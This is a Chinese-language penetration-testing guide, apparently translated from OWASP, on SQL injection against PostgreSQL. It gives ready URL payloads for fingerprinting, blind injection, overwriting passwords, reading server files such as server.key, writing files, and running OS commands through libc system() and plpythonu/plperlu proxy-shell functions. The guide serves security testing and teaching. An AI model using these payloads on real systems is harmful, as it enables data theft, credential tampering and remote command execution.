# 测试 PostgreSQL

## 概述

本节将讨论一些针对 PostgreSQL 的 SQL 注入技术。这些技术具有以下特点：

- PHP 连接器允许使用 `;` 作为语句分隔符执行多条语句
- SQL 语句可以通过追加注释字符 `--` 来截断
- 在 `SELECT` 语句中可以使用 `LIMIT` 和 `OFFSET` 来检索结果集的一部分

从现在开始，假设 `https://www.example.com/news.php?id=1` 存在 SQL 注入漏洞。

## 如何测试

### 识别 PostgreSQL

当发现 SQL 注入时，您需要仔细识别后端数据库引擎。可以通过使用 `::` 类型转换运算符来确定后端数据库引擎是 PostgreSQL。

#### 示例

`https://www.example.com/store.php?id=1 AND 1::int=1`

此外，函数 *version()* 可用于获取 PostgreSQL 版本信息。这也会显示底层操作系统类型和版本。

##### 示例

`https://www.example.com/store.php?id=1 UNION ALL SELECT NULL,version(),NULL LIMIT 1 OFFSET 1--`

可能返回的 banner 字符串示例：

`PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)`

### 盲注

对于盲 SQL 注入攻击，应考虑以下内置函数：

- 字符串长度
`LENGTH(str)`

- 从给定字符串中提取子字符串
`SUBSTR(str,index,offset)`

- 不带单引号的字符串表示
`CHR(104)||CHR(101)||CHR(108)||CHR(108)||CHR(111)`

从 8.2 版本开始，PostgreSQL 引入了一个内置函数 `pg_sleep(n)`，使当前会话进程休眠 `n` 秒。此函数可用于执行时间攻击（详见[盲 SQL 注入](https://owasp.org/www-community/attacks/Blind_SQL_Injection)）。

此外，您可以通过使用 libc 在早期版本中轻松创建自定义的 `pg_sleep(n)`：

- `CREATE function pg_sleep(int) RETURNS int AS '/lib/libc.so.6', 'sleep' LANGUAGE 'C' STRICT`

### 单引号转义

可以使用 `chr()` 函数对字符串进行编码，以防止单引号转义。

- `chr(n)`：返回 ASCII 值对应于数字 `n` 的字符
- `ascii(n)`：返回对应于字符 `n` 的 ASCII 值

假设您想编码字符串 'root'：

```sql
select ascii('r')
114
select ascii('o')
111
select ascii('t')
116
```

我们可以将 'root' 编码为：

`chr(114)||chr(111)||chr(111)||chr(116)`

#### 示例

`https://www.example.com/store.php?id=1; UPDATE users SET PASSWORD=chr(114)||chr(111)||chr(111)||chr(116)--`

### 攻击向量

#### 当前用户

当前用户的身份可以通过以下 SQL SELECT 语句检索：

```sql
SELECT user
SELECT current_user
SELECT session_user
SELECT usename FROM pg_user
SELECT getpgusername()
```

##### 示例

```text
https://www.example.com/store.php?id=1 UNION ALL SELECT user,NULL,NULL--
https://www.example.com/store.php?id=1 UNION ALL SELECT current_user, NULL, NULL--
```

#### 当前数据库

内置函数 current_database() 返回当前数据库名称。

##### 示例

`https://www.example.com/store.php?id=1 UNION ALL SELECT current_database(),NULL,NULL--`

#### 从文件读取

PostgreSQL 提供了两种访问本地文件的方式：

- `COPY` 语句
- `pg_read_file()` 内部函数（从 PostgreSQL 8.1 开始）

##### COPY

此运算符在文件和表之间复制数据。PostgreSQL 引擎以 `postgres` 用户身份访问本地文件系统。

###### 示例

```text
/store.php?id=1; CREATE TABLE file_store(id serial, data text)--
/store.php?id=1; COPY file_store(data) FROM '/var/lib/postgresql/.psql_history'--
```

数据应通过执行 `UNION Query SQL Injection` 来检索：

- 检索先前通过 `COPY` 语句添加到 `file_store` 中的行数
- 通过 UNION SQL 注入一次检索一行

```text
/store.php?id=1 UNION ALL SELECT NULL, NULL, max(id)::text FROM file_store LIMIT 1 OFFSET 1;--
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 1;--
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 2;--
...
...
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 11;--
```

##### pg_read_file()

此函数在 `PostgreSQL 8.1` 中引入，允许读取 DBMS 数据目录内的任意文件。

###### 示例

`SELECT pg_read_file('server.key',0,1000);`

#### 写入文件

通过反转 COPY 语句，我们可以使用 `postgres` 用户权限写入本地文件系统。

`/store.php?id=1; COPY file_store(data) TO '/var/lib/postgresql/copy_output'--`

#### Shell 注入

PostgreSQL 提供了一种机制，通过使用动态库和脚本语言（如 python、perl 和 tcl）添加自定义函数。

##### 动态库

直到 PostgreSQL 8.1，可以添加与 `libc` 链接的自定义函数：

`CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT`

由于 `system` 返回一个 `int`，我们如何从 `system` 的 stdout 获取结果？

这里有一个小技巧：

- 创建一个 `stdout` 表：`CREATE TABLE stdout(id serial, system_out text)`
- 执行 shell 命令并重定向其 `stdout`：`SELECT system('uname -a > /tmp/test')`
- 使用 `COPY` 语句将前一个命令的输出推送到 `stdout` 表中：`COPY stdout(system_out) FROM '/tmp/test*'`
- 从 `stdout` 检索输出：`SELECT system_out FROM stdout`

###### 示例

```text
/store.php?id=1; CREATE TABLE stdout(id serial, system_out text) --
/store.php?id=1; CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6','system' LANGUAGE 'C'
STRICT --
/store.php?id=1; SELECT system('uname -a > /tmp/test') --
/store.php?id=1; COPY stdout(system_out) FROM '/tmp/test' --
/store.php?id=1 UNION ALL SELECT NULL,(SELECT system_out FROM stdout ORDER BY id DESC),NULL LIMIT 1 OFFSET 1--
```

##### Plpython

PL/Python 允许用户使用 python 编写 PostgreSQL 函数。它是不受信任的，因此无法限制用户的操作。默认情况下未安装，可以通过 `CREATELANG` 在给定数据库上启用。

- 检查数据库是否启用了 PL/Python：`SELECT count(*) FROM pg_language WHERE lanname='plpythonu'`
- 如果没有，尝试启用：`CREATE LANGUAGE plpythonu`
- 如果上述任一操作成功，创建一个代理 shell 函数：`CREATE FUNCTION proxyshell(text) RETURNS text AS 'import os; return os.popen(args[0]).read() 'LANGUAGE plpythonu`
- 尽情使用：`SELECT proxyshell(os command);`

###### 示例

- 创建代理 shell 函数：`/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS ‘import os;return os.popen(args[0]).read()’ LANGUAGE plpythonu;--`
- 运行操作系统命令：`/store.php?id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;--`

##### Plperl

Plperl 允许我们使用 perl 编写 PostgreSQL 函数。通常，它作为受信任语言安装，以禁用与底层操作系统交互的运行时执行操作（如 `open`）。这样做使得无法获得操作系统级别的访问。要成功注入类似代理 shell 的函数，我们需要从 `postgres` 用户安装不受信任的版本，以避免受信任/不受信任操作的所谓应用程序掩码过滤。

- 检查是否启用了 PL/perl-untrusted：`SELECT count(*) FROM pg_language WHERE lanname='plperlu'`
- 如果没有，假设 sysadm 已安装 plperl 包，尝试：`CREATE LANGUAGE plperlu`
- 如果上述任一操作成功，创建一个代理 shell 函数：`CREATE FUNCTION proxyshell(text) RETURNS text AS 'open(FD,"$_[0] |");return join("",<FD>);' LANGUAGE plperlu`
- 尽情使用：`SELECT proxyshell(os command);`

###### 示例

- 创建代理 shell 函数：`/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS 'open(FD,"$_[0] |");return join("",<FD>);' LANGUAGE plperlu;`
- 运行操作系统命令：`/store.php?id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;--`
